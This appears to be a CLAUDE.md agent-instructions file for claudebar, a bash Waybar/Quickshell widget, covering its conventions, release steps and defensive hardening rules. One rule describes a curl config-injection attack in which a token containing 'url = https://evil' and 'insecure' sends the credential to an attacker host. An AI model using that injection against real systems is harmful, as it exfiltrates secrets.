# CLAUDE.md

## Tooling

- Install: `make install PREFIX=~/.local` (or `sudo make install`)
- No build step or linter; tests live in `tests/` (run `bash tests/test_*.sh`)

## Non-Obvious Rules

- **The CLI always runs through `/bin/sh -c 'exec "$0" "$@"'`, never direct.** Handing Quickshell 0.3.1 a nonexistent binary ABORTS the whole shell inside the failed start (issue #6) — before any QML signal fires, so no handler can catch it, and the shell crash-loops. sh always starts; a failed exec is sh exiting 127 (not found) or 126 (not executable). The failed-start discriminator is therefore `!sawExit || exitCode === 126 || exitCode === 127` on empty output: `!sawExit` stays as the belt for a Quickshell that emits neither `started` nor `exited`, and 126/127 is a deliberate approximation — a foreign broken `claudebar` exiting 126/127 empty lands there too, and the bundled fallback is the right move for it as well (the script itself always exits 0). An `exited` run with empty output and any other code is an operational failure, never "not installed".
- **The bundled-script fallback fires ONLY on a failed start.** The plugin clone carries the script, so the panel switches `resolvedBin` to the clone's copy when PATH cannot start it. PATH first, always: the AUR release wins when it exists. Never fall back on operational errors. A later `yay -S` applies on the next shell restart.
- **URL→path decodes each segment** (mirror of `Util.fileUrl`). The naive scheme strip is banned; `test_bundled_fallback.sh` pins it. A bad `%` degrades to PATH-only.
- **`schema_version` is pinned to 2 on both sides.** A schema bump must change script, panel and tests in one commit.
- **`installCmd` is the one constant** — the message shows it and the button copies it (`Util.execArgv(["wl-copy", ...])`, no shell line, no trailing newline). The button gates on `notInstalled`, never on error text.

- **A tooltip meter is PARKED, not rendered in place.** The bar has to reach the tooltip's right edge, and that edge is the widest TEXT line — which does not exist yet while the lines are being collected. So a meter pushes `METER:<i>` into `lines` plus one entry in the parallel `meter_*` arrays, and the width pass resolves it. The width pass MUST skip `METER:` lines, or the measurement is circular. Every meter in one tooltip gets the SAME bar length: they stack, so a reader compares them against each other.
- `BAR_LEN` is mutated for the tooltip AFTER the bar text is built. `GRAD_CELLS` is indexed by cell position, so it has to be rebuilt (`GRAD_CELLS=(); init_grad_cells`) right after — a longer bar otherwise reads past the end of the array, which is fatal under `set -u`.

- The script must **always exit 0**, even on errors — Waybar hides modules that exit non-zero. Use `die()` for error output.
- All output must be valid Waybar JSON: `{"text":"...", "tooltip":"...", "class":"..."}`
- Tooltip uses **Pango markup** for rich formatting (colors, bold, box-drawing borders)
- `set -euo pipefail` is enforced — all variables must be set before use
- Bar text is wrapped in Pango `<span foreground='...'>` for coloring — raw text won't render colors
- OAuth client ID (`9d1c250a-...`) is the public Claude CLI client ID, not a secret
- Cache writes use atomic `mktemp` + `mv` to avoid partial reads from concurrent Waybar instances
- `flock` serializes API calls across multi-monitor Waybar instances sharing the same cache

## Hardening rules — the widget runs INSIDE omarchy-shell

The plugin is not a short-lived Waybar exec here: it lives in the long-running
shell process. A read that never returns does not degrade the widget, it takes
the whole shell down. These four rules exist for that, and a security review of
the plugin marketplace checks them. All four have regression tests in
`tests/test_hardening.sh`.

- **Every read of a file this script does not own goes through `read_bounded`.**
  Credentials, `~/.claude.json`, the usage/credits cache, `.last_error`, the
  Omarchy theme, the pywal palette. The `[[ -f ]]` inside it rejects a FIFO
  cheaply (verified with `mkfifo`: `-f` is false for FIFO, socket, directory
  and device) but it is a check on a PATH, and the open that follows is a
  second syscall — swap the file in between and the open hangs anyway. That is
  why the reader is `dd iflag=nonblock`, the one coreutils reader that passes
  `O_NONBLOCK` to `open(2)`: `head -c` on a FIFO times out, `dd` returns at
  once, and on a regular file the flag changes nothing. The byte cap is the
  other half — 64 KiB for machine-written state, 256 KiB for a theme, 4 MiB for
  `~/.claude.json` (the CLI's own file, 61 KiB today and growing with history).
  **A file handed to `jq` is read this way and piped in on stdin; `jq` never
  opens a foreign path itself**, because nothing bounds it if the file grows.
  Where a cap can truncate, the caller must degrade to a branch that already
  exists — the oversize `~/.claude.json` reports no organization UUID, exactly
  as a missing one does.
- **Every write on a predictable path is guarded, and on the fd where there is
  one.** `open(2)` for writing on a FIFO blocks for a reader that never comes,
  so the write side stalls exactly like the read side. The fetch lock opens
  `exec 9<>` — read-write, which `fifo(7)` guarantees never blocks — and then
  checks `/dev/fd/9`, so no decision rests on a stat that can go stale.
  `writable_path` (a path check, therefore racy) is left only on the
  `.last_error` write, where a `>` redirection offers no descriptor to check.
  `touch` is safe (coreutils uses `O_NONBLOCK`) and `mv` is `rename(2)`, so the
  mktemp+mv cache writes need no guard.
- **Every `curl` starts with `-q`, as the FIRST argument.** Otherwise curl
  reads `~/.curlrc` before our `--config -`, and whoever can write that file —
  the premise of this whole section — adds `url =`, `insecure` or another
  `config` to every transfer. Measured on curl 8.21.0: a bogus option there is
  diagnosed without `-q` and ignored with it.
- **`curl_auth_cfg` is the ONLY place a curl config file is built, and it
  rejects.** The config parser is line oriented: a newline inside a value ends
  the line and the rest parses as fresh options. A token carrying
  `url = https://evil` plus `insecure` gets the attacker a second transfer with
  the credential attached — proven against a local TLS listener — and
  `--proto '=https'` does not stop it, because the attacker simply picks an
  https URL. Escaping is the wrong answer: a bearer with a line break is a
  tampered file, so `token_is_safe` rejects it at BOTH sources, the credentials
  file and the refresh response.
- **The panel refuses to retain more than 1 Mi CHARACTERS of CLI output.** A
  tripwire in the `StdioCollector`, not a limit — the stream is already
  buffered by then — and it counts UTF-16 units, because QML's `String.length`
  has no byte view. The property is `maxChars` and the message says characters:
  a megabyte of units is up to three megabytes of UTF-8, so a name or a message
  that says "KiB" states a bound this code never measures.
  Its message must survive `finalizeRun`, which is why the not-installed hint
  is gated on `loadError === ""`: the tripwire also leaves `capturedText` empty,
  and there "not installed" is plainly false.

Secrets never go in argv — **and that means every process, not just curl**.
The bearer token and the refresh token reach curl through stdin (`--config -`
and `--data @-`), and they reach `jq` through the ENVIRONMENT (`rt="$tok" jq
'$ENV.rt'`, never `--arg rt "$tok"`): `/proc/<pid>/cmdline` is readable by every
process of this user for the length of the call, while `/proc/<pid>/environ` is
readable only by its owner. `tests/test_hardening.sh` spies on the argv of both
programs across a full refresh cycle.

## Release

1. Merge the work into `master`. In the release commit (`chore: release X.Y.Z`): bump the `manifest.json` version (the script carries no version string; the tag and the manifest ARE the version). Push.
2. `git tag vX.Y.Z && git push origin --tags`.
3. `gh release create vX.Y.Z` (bash widget: source-only release, nothing to build).
4. Only then bump the AUR package (`claudebar`) per the workspace `AGENTS.md` (`~/Work/personal/AGENTS.md`).
